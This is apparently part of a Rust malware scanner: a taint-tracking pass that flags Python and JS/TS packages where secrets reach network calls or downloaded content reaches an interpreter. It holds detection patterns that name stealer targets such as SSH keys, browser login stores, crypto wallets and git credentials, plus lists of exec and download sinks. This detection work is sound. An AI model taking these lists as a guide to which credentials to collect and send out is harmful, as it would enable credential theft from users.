//! Variable-level data flow inside one file (Python, JS/TS): a secret that
//! reaches a network call, and downloaded content that reaches an
//! interpreter. The proximity chains in correlate.rs miss both once the read
//! and the send sit far apart or a few assignments away.
//!
//! Lexical, like zipslip.rs. The file is cut into statements at newlines and
//! `;`, a statement running on while a bracket is open (a multi-line dict
//! literal is one statement; a JS block brace is not). Statements are read
//! in order: an assignment, a mutation (`x.update(..)`, `x[k] = ..`,
//! `x.k = ..`) or a binding (`with .. as x`, `for x in ..`) passes taint from
//! its right side to the name on its left, and a later sink reports when its
//! arguments carry taint. A name assigned a new value with no taint in it is
//! clean again. Bundles are left to the proximity chains: a large
//! or minified file is skipped.
//!
//! Calls inside the file are followed through two summaries per function,
//! made before the walk: a function that hands one of its parameters to a
//! network sink is a sink for that argument (`send(tag, data)` wrapping
//! `req.write(data)`), and a call of a function that returns a secret
//! carries it (`collect()`). Wrappers are looked for twice, so a wrapper
//! around a wrapper is seen and a third level is not; what a function
//! returns is followed one level. A download that comes back from a call
//! counts only at an in-process code sink (`exec(_transfer(u))`): at a
//! process sink the summaries read setuptools' `download_svn(url)` and a
//! `curl` wrapper as running what was fetched.
//!
//! A call into another file is followed over one relative import
//! (`cross_file`): a function the file it names returns a secret from, or
//! hands a parameter to a network sink in.
//!
//! shortcut: one namespace per file and no scopes, so two functions that
//! reuse a name share its taint; a value kept in a global by one function
//! and read by another that the file defines first is lost. Move to a real
//! parser (tree-sitter) if that over- or under-reaches, here or across
//! files. A first version that ignored statement order
//! flagged 53 of 526 clean packages (`process.env` in a fork option, then
//! an unrelated `.send()`).

use crate::correlate::{CREDENTIAL_EXFIL, DOWNLOAD_EXECUTE};
use crate::RuleMatch;
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
enum Kind {
    /// The whole environment, an SSH key, a browser or wallet store.
    Secret,
    /// A response body or the output of `curl`.
    Download,
}

/// Where a taint came from, for the finding's context.
#[derive(Clone)]
struct Origin {
    line: usize,
    what: String,
    /// The name holds the environment mapping itself (`env = process.env`, a
    /// copy, an object with it inside) or is a parameter being summarised.
    /// Such a value counts where it is serialised or handed to a sink; a
    /// field read from it (`env.TOKEN`) or a helper called with it
    /// (`baseUrl(env)`) is one setting. False for anything derived
    /// (`JSON.stringify(env)`, `body.substring(…)`).
    alias: bool,
    /// Came back from a call of a function of the file (`cx.returns`).
    via_call: bool,
}

struct Stmt {
    line: usize,
    text: String,
    /// The innermost named function this statement is in (`Func` index).
    func: Option<usize>,
    /// A function's own header (`function f(a)`, `def f(a):`), not a call.
    is_def: bool,
}

/// A named function of the file. Callbacks and blocks without a name belong
/// to the function around them.
struct Func {
    name: String,
    /// First identifier of each parameter, by position; empty when the
    /// parameter is a pattern.
    params: Vec<String>,
    parent: Option<usize>,
}

/// A function of the file that passes one of its parameters to a network
/// sink.
#[derive(Clone)]
struct SinkFunc {
    call: Regex,
    name: String,
    param: usize,
    param_name: String,
}

/// What the walk knows about the file besides the statements.
#[derive(Clone)]
struct Cx<'a> {
    raw_http: bool,
    /// A call that makes a network client (`https.request(`, `httpx.Client(`)
    /// and the names bound to one: what a method sink is called on.
    client: &'a Regex,
    receivers: Vec<String>,
    net_sink: &'a Regex,
    code_sink: &'a Regex,
    sink_funcs: Vec<SinkFunc>,
    /// Functions of the file that return what one of their parameters holds
    /// (`collect(env)` that walks it): a call of one keeps the value.
    passers: Vec<String>,
    /// Functions that return a secret or a download: name, a call of it,
    /// what comes back.
    returns: Vec<(String, Regex, Kind, Origin)>,
    /// Functions of an imported file that return a secret (`cross_file`): a
    /// call of one under the name it has here, what comes back.
    imported: Vec<(Regex, Origin)>,
}

struct Hit {
    name: &'static str,
    origin: Origin,
    line: usize,
    sink: String,
}

type Taint = HashMap<String, (Kind, Origin)>;

/// The origin of a parameter seeded as tainted while a function is
/// summarised: no real origin starts with `\0`.
const PARAM: char = '\0';

/// Paths only a stealer reads. Not `~/.aws/credentials`, `.npmrc` or
/// `.netrc`: SDKs and package managers read those to sign their own requests.
/// `'.ssh'` as a path part of its own (`join(home, '.ssh')`) counts. `'.env'`
/// does not: tried, and a tool that reads its own API key from `.env` and
/// sends it to that API looks the same (mcp-serper-search).
static SECRET_PATH: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:\.ssh/|id_rsa|id_ed25519|id_ecdsa|Login Data|Local State|Local Storage/leveldb|wallet\.dat|\.electrum|Exodus/|\.git-credentials|keychain-db|['"]\.ssh['"])"#)
        .unwrap()
});

static DOWNLOAD_SRC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|\W)urlopen\s*\(|requests\.(?:get|post|request)\s*\(|httpx\.(?:get|post|stream)\s*\(|(?:^|[^\w.])fetch\s*\(|axios(?:\.(?:get|post|request))?\s*\(|https?\.get\s*\(|(?:^|[^\w.])got\s*\(|["'](?:curl|wget)["']|["'`](?:curl|wget)\s)"#)
        .unwrap()
});

static NET_SINK_PY: LazyLock<Regex> = LazyLock::new(|| {
    // Not a bare `.patch(`: `mock.patch("os.environ", …)` in a test.
    Regex::new(r#"(?:requests\.(?:post|put|patch|request|get)|(?:^|\W)urlopen|\.(?:post|put|request|sendall|sendto|sendmail|send_message)|gethostbyname|getaddrinfo)\s*\("#)
        .unwrap()
});
/// Named network APIs only: `.send()` and `.post()` are IPC, Express
/// responses and router methods far more often than requests.
static NET_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])fetch|axios(?:\.(?:post|put|patch|request|get))?|sendBeacon|(?:^|[^\w.])got(?:\.\w+)?|(?:^|[^\w.])needle|dns\.(?:lookup|resolve\w*))\s*\("#)
        .unwrap()
});

/// A first argument that is a loopback URL written out, the port a number or
/// one interpolation: `http://127.0.0.1:${port}/hook`. Not a host that only
/// starts like one (`localhost.example`, `127.0.0.1:80@example`).
static LOOPBACK: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^\s*(?:url\s*=\s*)?[fF]?["'`]https?://(?:127\.0\.0\.1|localhost|\[::1\])(?::(?:\d+|\$?\{[^{}]*\}))?(?:[/?"'`]|$)"#)
        .unwrap()
});

/// `req.write(data)` / `req.end(data)` send only when the file speaks raw HTTP
/// and `req` is such a request or socket (`on_client`).
static RAW_HTTP: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:https?\.request|net\.(?:connect|Socket|createConnection)|tls\.connect)\s*\("#)
        .unwrap()
});
static STREAM_SINK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"\.(?:write|end)\s*\("#).unwrap());
/// Python's `.post(` / `.put(` / `.request(` are requests on a client of an
/// HTTP library, not on a queue (`_QUEUE.put(item)`).
const METHOD_SINKS: &[&str] = &[".post", ".put", ".request"];
static HTTP_CLIENT_PY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:\b(?:requests|httpx|aiohttp|urllib3|http\.client)\.\w+|\b(?:Session|Client|AsyncClient|ClientSession|HTTPS?Connection|PoolManager))\s*\(").unwrap()
});
static IMPORT_AS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^\s*import\s+(?:requests|httpx)\s+as\s+(\w+)").unwrap());

/// Not `eval`: Python's runs one expression, and scrapers misuse it to parse
/// responses (`eval(r.text)`); downloaded code goes through `exec`.
static CODE_SINK_PY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])(?:exec|compile)|os\.system|os\.popen|subprocess\.\w+)\s*\("#)
        .unwrap()
});
static CODE_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])eval|new\s+Function|(?:^|[^\w.])Function|vm\.run\w*|execSync|spawnSync|spawn|child_process\.exec)\s*\("#)
        .unwrap()
});
/// A subprocess or `spawn` call runs downloaded content only through an
/// inline-code flag (`node -e`, `python -c`) or a shell.
static INLINE_CODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:["'](?:node|python3?|bash|sh|zsh|perl|ruby|pwsh|powershell|cmd)(?:\.exe)?["']|process\.execPath)\s*,\s*\[?\s*["'](?:-e|-c|--eval|-Command|/c)["']|shell\s*[=:]\s*[Tt]rue)"#)
        .unwrap()
});

/// The code sinks that run code in this process, not a program: the only
/// ones a download returned by a call counts at.
static IN_PROCESS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^(?:(?:^|[^\w.])(?:exec|compile|eval|Function)|new\s+Function|vm\.run\w*)\s*\("#)
        .unwrap()
});

/// An argument of a process start that is not the command: the options
/// object of `spawn`, a keyword of `subprocess.run` (but `args=`).
static OPTION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^\s*(?:\{|[A-Za-z_]\w*\s*=[^=])").unwrap());
static INSTALLER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(?:npm|pnpm|yarn|bun|npx|pip3?|pipx|uv)\b").unwrap());
/// The version in `name@${v}` / `name=={v}`.
static PACKAGE_VERSION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:@|==)\$?\{[^{}]*\}").unwrap());
/// After a response or the call that fetched it: its status, not its body
/// (`r.status < 500`, `(await fetch(u)).ok`).
static STATUS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[\s)]*\??\.(?:status|statusCode|status_code|statusText|ok|returncode)\b").unwrap()
});

/// A call whose value is the output of the command it is given.
static RUNS_COMMAND: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:subprocess\.\w+|os\.popen|getoutput|execSync|spawnSync|execFileSync|(?:^|[^\w.])(?:exec|run|popen|check_output))\s*\(").unwrap()
});

static STARTS_PROCESS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:Popen|subprocess\.\w+|spawn\w*|fork|exec\w*)\s*\(").unwrap());
static CHILD_ENV: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\benv\s*[=:]\s*").unwrap());

static WITH_AS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:^|,)\s*(?:async\s+)?(?:with\s+)?(.+?)\s+as\s+([A-Za-z_]\w*)").unwrap()
});
static FOR_IN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*for\s*\(?\s*(?:const|let|var)?\s*([\w$,\s\[\]{}]+?)\s+(?:in|of)\s+(.+)")
        .unwrap()
});
static MUTATE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"([A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?)\.(?:update|append|extend|push|add|set|insert|setdefault)\s*\(").unwrap()
});
static IDENT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?").unwrap());

/// The text before a JS block's `{` when it is a named function: `function
/// f(a)`, `f = (a) =>`, `f: function (a)`, `f = a =>`, a method `f(a)`.
/// Groups: (1,2), (3,4), (5,6), (7,8) are name and parameters; a default
/// value may hold one pair of parentheses (`now = Date.now()`).
static JS_FUNC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:function\s*\*?\s*([\w$]+)\s*\(((?:[^()]|\([^()]*\))*)\)|([\w$]+)\s*[:=]\s*(?:async\s*)?(?:function\s*\*?\s*[\w$]*\s*)?\(((?:[^()]|\([^()]*\))*)\)|([\w$]+)\s*[:=]\s*(?:async\s+)?([\w$]+)\s*=>|^\s*(?:(?:async|static|export|default)\s+)*([\w$]+)\s*\(((?:[^()]|\([^()]*\))*)\))(?:\s*:\s*[\w$<>\[\]|., ]+)?\s*(?:=>)?\s*$").unwrap()
});
/// `onText = () =>`: an arrow function that is a default value.
static DEFAULT_ARROW: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[^=!<>]=\s*(?:async\s*)?(?:\([^()]*\)|[\w$]+)\s*=>$").unwrap());
/// TypeScript's output for an async arrow function: `f = (a, b) =>
/// __awaiter(void 0, void 0, void 0, function* ()`. With default values the
/// generator carries the real parameter names (group 3).
static TS_ASYNC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"([\w$]+)\s*=\s*\(([^()]*)\)\s*=>\s*__awaiter\((?:[^()]|\([^()]*\))*,\s*function\s*\*\s*\(([^()]*)\)\s*$").unwrap()
});
/// `promise.then((value) =>`: the callback's parameter is what the promise
/// resolves to.
static THEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^(.*?)\.then\(\s*(?:async\s*)?(?:function\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)")
        .unwrap()
});
static PY_DEF: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(?:async\s+)?def\s+(\w+)\s*\((.*)\)\s*(?:->[^:]*)?:\s*$").unwrap()
});
const NOT_FUNCTIONS: &[&str] = &[
    "if", "for", "while", "switch", "catch", "with", "function", "return", "typeof", "await", "do",
    "else",
];

/// Chains for one file, `Chain: Credential Exfiltration` and `Chain: Download
/// and Execute`, the same names the proximity chains use.
pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
    let Some((stmts, cx)) = summary(rel_path, content) else {
        return Vec::new();
    };
    let (hits, _) = walk(stmts.iter(), &mut Taint::new(), &cx);
    hits.iter()
        .map(|h| flow(rel_path, h.name, &h.origin, h.line, &h.sink))
        .collect()
}

const JS_EXTENSIONS: &[&str] = &[".js", ".mjs", ".cjs", ".ts", ".mts", ".cts", ".jsx", ".tsx"];

/// Whether the file is Python; None when it is neither Python nor JS/TS.
fn is_python(rel_path: &str) -> Option<bool> {
    let lower = rel_path.to_ascii_lowercase();
    if lower.ends_with(".py") || lower.ends_with(".pyw") {
        return Some(true);
    }
    JS_EXTENSIONS
        .iter()
        .any(|e| lower.ends_with(e))
        .then_some(false)
}

/// A 300 KB bundle chunk reuses `res` and `result` in hundreds of functions
/// (lerna); the scripts this is for are a few KB.
pub const MAX_BYTES: usize = 64 * 1024;

/// A large or minified file, left to the proximity chains.
fn too_large(content: &str) -> bool {
    content.len() > MAX_BYTES || content.lines().any(|l| l.len() > 4000)
}

/// Whether a statement of the file names what a secret is read from (the
/// environment other than one variable of it, a path in `SECRET_PATH`), and
/// whether one calls a network sink: without the first no function of the
/// file returns a secret, without the second none is a wrapper around a
/// sink. On the statements, where the walk looks: a comment inside
/// `process/**/.env` is gone there.
fn reads_and_sends(rel_path: &str, content: &str) -> (bool, bool) {
    let Some(python) = is_python(rel_path).filter(|_| !too_large(content)) else {
        return (false, false);
    };
    let (stmts, _) = statements(content, python);
    let sink: &Regex = if python { &NET_SINK_PY } else { &NET_SINK_JS };
    let raw_http = !python && RAW_HTTP.is_match(content);
    let env = |t: &str| {
        (t.contains("process.env") || t.contains("os.environ"))
            && mentions(&code_only(t)).iter().any(|(name, how, _)| {
                matches!(name.as_str(), "process.env" | "os.environ") && *how != Mention::Pick
            })
    };
    let any = |found: &dyn Fn(&str) -> bool| stmts.iter().any(|s| found(&s.text));
    (
        any(&|t| env(t) || SECRET_PATH.is_match(t)),
        any(&|t| sink.is_match(t) || (raw_http && STREAM_SINK.is_match(t))),
    )
}

/// The statements of a file and its summaries; None for a file the pass
/// does not read.
fn summary(rel_path: &str, content: &str) -> Option<(Vec<Stmt>, Cx<'static>)> {
    let python = is_python(rel_path)?;
    if too_large(content) {
        return None;
    }
    let (stmts, funcs) = statements(content, python);
    let client: &Regex = if python { &HTTP_CLIENT_PY } else { &RAW_HTTP };
    // `req = https.request(o)`, `with httpx.Client() as c`, `import requests
    // as r`.
    let receivers = stmts
        .iter()
        .flat_map(|s| {
            let alias = IMPORT_AS.captures(&s.text).map(|c| c[1].to_string());
            let bound = bindings(&s.text).into_iter();
            let bound = bound.filter(|(_, rhs, ..)| client.is_match(rhs));
            bound
                .flat_map(|(names, ..)| names)
                .chain(alias)
                .collect::<Vec<_>>()
        })
        .collect();
    let mut cx = Cx {
        raw_http: !python && RAW_HTTP.is_match(content),
        client,
        receivers,
        net_sink: if python { &NET_SINK_PY } else { &NET_SINK_JS },
        code_sink: if python { &CODE_SINK_PY } else { &CODE_SINK_JS },
        sink_funcs: Vec::new(),
        passers: Vec::new(),
        returns: Vec::new(),
        imported: Vec::new(),
    };
    summarize(&stmts, &funcs, &mut cx);
    Some((stmts, cx))
}

/// `const c = require('./x')`, `const { f, g: h } = require('./x')`,
/// `const f = require('./x').f`. Groups: the name or the list, the path,
/// the member. Relative paths only: `require('collect')` is a package.
static JS_REQUIRE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:const|let|var)\s+([\w$]+|\{[^{}]*\})\s*=\s*require\s*\(\s*['"](\.{1,2}/[^'"\n]+)['"]\s*\)(\.[\w$]+)?"#)
        .unwrap()
});
/// `import c from './x'`, `import * as c from './x'`, `import { f, g as h }
/// from './x'`. Groups: the default name, the namespace, the list, the path.
static JS_IMPORT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\bimport\s+(?:([\w$]+)\s*,?\s*)?(?:\*\s*as\s+([\w$]+)|(\{[^{}]*\}))?\s*from\s*['"](\.{1,2}/[^'"\n]+)['"]"#)
        .unwrap()
});
/// `from .x import f, g as h`, `from pkg.x import (f, g)`, `from . import x`.
/// Groups: the dots, the module, the list.
static PY_FROM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?m)^\s*from\s+(\.*)([\w.]*)\s+import\s+(\([^()]*\)|[^\n#;]+)").unwrap()
});
/// `import x`, `import pkg.x as y`.
static PY_IMPORT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?m)^\s*import\s+([\w.]+)(?:\s+as\s+(\w+))?\s*(?:#.*)?$").unwrap()
});

/// `a`, `a as b`, `a: b` of an import list: the name there, the name here.
fn import_names(list: &str) -> Vec<(String, String)> {
    let word = |c: char| c.is_alphanumeric() || c == '_' || c == '$';
    list.split(',')
        .filter_map(|item| {
            let mut words = item.split(|c: char| !word(c)).filter(|w| !w.is_empty());
            let name = words.next()?;
            let local = words.rfind(|w| *w != "as").unwrap_or(name);
            Some((name.to_string(), local.to_string()))
        })
        .collect()
}

/// `spec` (`./lib/x`, `../x`, `pkg/x`) under the directory `dir`, as a
/// root-relative path; None above the root.
fn resolve(dir: &[&str], spec: &str) -> Option<String> {
    let mut parts = dir.to_vec();
    for seg in spec.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            s => parts.push(s),
        }
    }
    Some(parts.join("/"))
}

/// The scanned file an import of `base` loads: the path as written (JS), with
/// an extension, or the `index` / `__init__` of a directory.
fn module_file(base: &str, python: bool, known: &HashSet<&str>) -> Option<String> {
    let exts: &[&str] = if python { &[".py"] } else { JS_EXTENSIONS };
    let index = if python { "/__init__" } else { "/index" };
    let exact = (!python).then(|| base.to_string());
    let file = exts.iter().map(|e| format!("{base}{e}"));
    let dir = exts.iter().map(|e| format!("{base}{index}{e}"));
    let mut tried = exact.into_iter().chain(file).chain(dir);
    tried.find(|p| known.contains(p.as_str()))
}

/// What the file at `path` imports from the files in `known`: the file, the
/// function's name there (None: the module, its functions are called as
/// `here.f(`), the name here.
/// shortcut: a module that is one function (`module.exports = f`, `export
/// default`), a re-export, `require` of a variable and TypeScript's `./x.js`
/// for `x.ts` are not followed; add them if a sample needs one.
fn imports(
    path: &str,
    content: &str,
    python: bool,
    known: &HashSet<&str>,
) -> Vec<(String, Option<String>, String)> {
    let mut dir: Vec<&str> = path.split('/').collect();
    dir.pop();
    let mut out = Vec::new();
    let mut bind = |file: Option<String>, name: Option<&str>, local: &str| {
        if let Some(file) = file.filter(|f| f != path) {
            out.push((file, name.map(str::to_string), local.to_string()));
        }
    };
    if python {
        // `.x` is beside this file and each further dot one directory up;
        // `pkg.x` is under a directory above this file, the nearest first.
        let locate = |dots: usize, module: &str| {
            let sub = module.replace('.', "/");
            let tops = match dots {
                0 => 0..=dir.len(),
                _ => {
                    let top = (dir.len() + 1).checked_sub(dots)?;
                    top..=top
                }
            };
            tops.rev()
                .find_map(|k| module_file(&resolve(&dir[..k], &sub)?, true, known))
        };
        for c in PY_FROM.captures_iter(content) {
            let (dots, module) = (c[1].len(), &c[2]);
            for (name, local) in import_names(&c[3]) {
                // A function of the module, or a module of the package.
                bind(locate(dots, module), Some(&name), &local);
                bind(locate(dots, &format!("{module}.{name}")), None, &local);
            }
        }
        for c in PY_IMPORT.captures_iter(content) {
            let local = c.get(2).map_or(&c[1], |m| m.as_str());
            bind(locate(0, &c[1]), None, local);
        }
        return out;
    }
    let locate = |spec: &str| module_file(&resolve(&dir, spec)?, false, known);
    for c in JS_REQUIRE.captures_iter(content) {
        let file = locate(&c[2]);
        match (c[1].starts_with('{'), c.get(3)) {
            (false, None) => bind(file, None, &c[1]),
            (false, Some(member)) => bind(file, Some(&member.as_str()[1..]), &c[1]),
            (true, None) => {
                for (name, local) in import_names(&c[1]) {
                    bind(file.clone(), Some(&name), &local);
                }
            }
            (true, Some(_)) => {}
        }
    }
    for c in JS_IMPORT.captures_iter(content) {
        let file = locate(&c[4]);
        for module in [c.get(1), c.get(2)].into_iter().flatten() {
            bind(file.clone(), None, module.as_str());
        }
        for (name, local) in c.get(3).map_or(Vec::new(), |m| import_names(m.as_str())) {
            bind(file.clone(), Some(&name), &local);
        }
    }
    out
}

/// Credential flows that cross one import, which `flows` cannot see: a
/// function of an imported file that returns a secret, its result reaching a
/// network sink here (`const c = require('./lib/collect'); fetch(u, { body:
/// c.all() })`). The same summaries and the same walk as inside one file;
/// one import deep, so what the imported file imports is not followed. Not
/// the other way round, a secret read here handed to an imported wrapper
/// around a request: it flagged an agent runtime that hands its environment
/// to the session host it starts (four releases of `local-operator`,
/// ruleset 2026.11.16).
///
/// `paths`: the files the scan reads as code, root-relative with `/`;
/// `read`: the text of one, None to leave it out. Every file is read once
/// to find its imports, and an imported file at most twice more.
pub fn cross_file(paths: &[&str], read: impl Fn(&str) -> Option<String>) -> Vec<RuleMatch> {
    let known: HashSet<&str> = paths.iter().copied().collect();
    // `reads_and_sends` and the summary per file, each worked out once. A
    // summary costs what the file's own data-flow pass does, and making one
    // of every imported file took longer than the scan before it: so only
    // where a file imports a source or a sink and the other is there too,
    // in it or in what it imports.
    let mut text: HashMap<String, (bool, bool)> = HashMap::new();
    let mut summaries: HashMap<String, Option<Cx<'static>>> = HashMap::new();
    let mut out = Vec::new();
    for path in paths {
        let Some(python) = is_python(path) else {
            continue;
        };
        let Some(content) = read(path) else {
            continue;
        };
        let bound = imports(path, &content, python, &known);
        let mut theirs = false;
        for (file, ..) in &bound {
            let (reads, _) = *text.entry(file.clone()).or_insert_with(|| {
                read(file).map_or((false, false), |c| reads_and_sends(file, &c))
            });
            theirs |= reads;
        }
        if !theirs {
            continue;
        }
        let own = text.entry(path.to_string());
        if !own.or_insert_with(|| reads_and_sends(path, &content)).1 {
            continue;
        }
        let mut returns = Vec::new();
        for (file, name, local) in &bound {
            if !text[file].0 {
                continue;
            }
            let module = summaries
                .entry(file.clone())
                .or_insert_with(|| Some(summary(file, &read(file)?)?.1));
            let Some(module) = module else {
                continue;
            };
            // A call of the module's function `f` in this file. `\)?`:
            // TypeScript's output calls it as `(0, c.f)()`.
            let call = |f: &str| {
                let callee = match name {
                    Some(name) if name == f => regex::escape(local),
                    Some(_) => return None,
                    None => regex::escape(&format!("{local}.{f}")),
                };
                Regex::new(&format!(r"(?:^|[^\w$.]){callee}\)?\s*\(")).ok()
            };
            for (f, _, kind, origin) in &module.returns {
                if let (Kind::Secret, Some(called)) = (kind, call(f)) {
                    let mut origin = origin.clone();
                    origin.what = format!("{} in {file}", origin.what);
                    returns.push((called, origin));
                }
            }
        }
        if returns.is_empty() {
            continue;
        }
        let own = summaries
            .entry(path.to_string())
            .or_insert_with(|| Some(summary(path, &content)?.1));
        let Some(mut cx) = own.clone() else {
            continue;
        };
        let theirs: Vec<String> = returns.iter().map(|(_, o)| o.what.clone()).collect();
        // Added after the file's own summaries: a function here that returns
        // what an imported one gave it would be a second level.
        cx.imported = returns;
        let (stmts, _) = statements(&content, python);
        let (hits, _) = walk(stmts.iter(), &mut Taint::new(), &cx);
        // The file's first flow, when an import is one end of it: a flow
        // inside the file is `flows`' finding.
        let first = hits.iter().find(|h| h.name == CREDENTIAL_EXFIL);
        let crosses = |h: &&Hit| theirs.contains(&h.origin.what);
        if let Some(h) = first.filter(crosses) {
            out.push(flow(path, h.name, &h.origin, h.line, &h.sink));
        }
    }
    out
}

/// Statements in order: a sink sees only what earlier statements tainted.
/// Returns the first hit per chain and the taint of the first `return` that
/// carries any.
fn walk<'a>(
    stmts: impl Iterator<Item = &'a Stmt>,
    taint: &mut Taint,
    cx: &Cx,
) -> (Vec<Hit>, Option<(Kind, Origin)>) {
    let mut hits: Vec<Hit> = Vec::new();
    let mut returned = None;
    for s in stmts.filter(|s| !s.is_def) {
        // `@router.post('/hook')` declares a route; it sends nothing.
        let decorator = s.text.trim_start().starts_with('@');
        for (sink, kind, name) in [
            (cx.net_sink, Kind::Secret, CREDENTIAL_EXFIL),
            (cx.code_sink, Kind::Download, DOWNLOAD_EXECUTE),
        ] {
            if decorator || hits.iter().any(|h| h.name == name) {
                continue;
            }
            let mut hit = |origin: Origin, sink: &str| {
                hits.push(Hit {
                    name,
                    origin,
                    line: s.line,
                    sink: sink.to_string(),
                })
            };
            let mut found = false;
            for m in sink.find_iter(&s.text) {
                if METHOD_SINKS.iter().any(|p| m.as_str().starts_with(p))
                    && !on_client(&s.text, m.start(), cx)
                {
                    continue;
                }
                let args = call_args(&s.text, m.end() - 1);
                // A request to this machine talks to a local daemon.
                if kind == Kind::Secret && LOOPBACK.is_match(args) {
                    continue;
                }
                // A process started with downloaded data among its arguments
                // (a version, a URL, a pid) runs that program, not the data.
                let starts = m.as_str().contains("subprocess") || m.as_str().contains("spawn");
                if name == DOWNLOAD_EXECUTE && starts && !INLINE_CODE.is_match(args) {
                    continue;
                }
                let args = if name == DOWNLOAD_EXECUTE {
                    what_runs(args, starts)
                } else {
                    args.to_string()
                };
                if let Some((_, origin)) = carried(&args, s.line, taint, Some(kind), cx) {
                    // A helper's download handed to a program (`os.system`,
                    // `subprocess`) is setuptools' `download_svn(url)`.
                    // An `exec(` inside a string is a script for another host.
                    if name == DOWNLOAD_EXECUTE
                        && origin.via_call
                        && (!IN_PROCESS.is_match(m.as_str()) || in_literal(&s.text, m.start()))
                    {
                        continue;
                    }
                    hit(origin, m.as_str());
                    found = true;
                    break;
                }
            }
            if cx.raw_http && kind == Kind::Secret && !found {
                for m in STREAM_SINK.find_iter(&s.text) {
                    if !on_client(&s.text, m.start(), cx) {
                        continue;
                    }
                    let args = call_args(&s.text, m.end() - 1);
                    if let Some((_, origin)) = carried(args, s.line, taint, Some(kind), cx) {
                        hit(origin, m.as_str());
                        found = true;
                        break;
                    }
                }
            }
            // A function of this file that hands the argument to a sink.
            for f in &cx.sink_funcs {
                if found || kind != Kind::Secret {
                    break;
                }
                for m in f.call.find_iter(&s.text) {
                    let args = split_args(call_args(&s.text, m.end() - 1));
                    let keyword = format!("{}=", f.param_name);
                    let arg = args
                        .iter()
                        .find(|a| a.trim_start().starts_with(&keyword))
                        .or(args.get(f.param));
                    let got = arg.and_then(|a| carried(a, s.line, taint, Some(kind), cx));
                    if let Some((_, origin)) = got {
                        hit(origin, &format!("{}(", f.name));
                        found = true;
                        break;
                    }
                }
            }
        }
        if returned.is_none() {
            // `return x`, not `returns = x`.
            let value = s.text.trim_start().strip_prefix("return");
            if let Some(value) =
                value.filter(|v| !v.starts_with(|c: char| c.is_alphanumeric() || c == '_'))
            {
                returned = carried(value, s.line, taint, None, cx);
            }
        }
        for (targets, rhs, element, plain) in bindings(&s.text) {
            // The environment handed to a child process is not in the handle
            // that comes back (`info['popen'] = Popen(cmd, env=env)`, nbclassic).
            let rhs = if STARTS_PROCESS.is_match(rhs) {
                without_child_env(rhs)
            } else {
                rhs.to_string()
            };
            if let Some((kind, mut origin)) = carried(&rhs, s.line, taint, None, cx) {
                // One item of the environment is not the mapping.
                origin.alias &= !element;
                for t in targets {
                    taint.entry(t).or_insert((kind, origin.clone()));
                }
            } else if plain && !idents(&rhs).iter().any(|n| taint.contains_key(n)) {
                // A new value with nothing tainted in it: `env = {**os.environ,
                // 'T': t}` for a child process, then in another method `env =
                // pool.build_envelope(obj)` and `sock.sendall(json.dumps(env))`.
                // shortcut: no branches, so `x = {}` in an `except` clears what
                // the `try` put in `x`; needs scopes (see the module header).
                for t in targets {
                    taint.remove(&t);
                }
            }
        }
    }
    (hits, returned)
}

/// The part of a code sink's arguments that is run. Of a process start
/// (`starts`) the program and its arguments, not the options: `{ input: body,
/// env, stdio }`, `input=r.text` are data for it. And not a version put in an
/// install command, which `shell: true` made look like a shell script:
/// `spawnSync('npm', ['install', '-g', `pkg@${latest}`], { shell: true })`
/// is a self-update.
fn what_runs(args: &str, starts: bool) -> String {
    let option = |a: &&str| OPTION.is_match(a) && !a.trim_start().starts_with("args");
    let mut run = args.to_string();
    if starts {
        let command = split_args(args).into_iter().filter(|a| !option(a));
        run = command.collect::<Vec<_>>().join(",");
    }
    if INSTALLER.is_match(&run) {
        run = PACKAGE_VERSION.replace_all(&run, "").into_owned();
    }
    run
}

/// `rhs` without the `env=` / `env:` arguments of the process it starts, each
/// up to the comma or bracket that ends it: `env={**os.environ, **(env or
/// {})}` has braces inside.
fn without_child_env(rhs: &str) -> String {
    let mut out = String::new();
    let mut rest = rhs;
    while let Some(m) = CHILD_ENV.find(rest) {
        out.push_str(&rest[..m.start()]);
        rest = &rest[m.end()..];
        let mut depth = 0;
        let ends = |c: char| {
            match c {
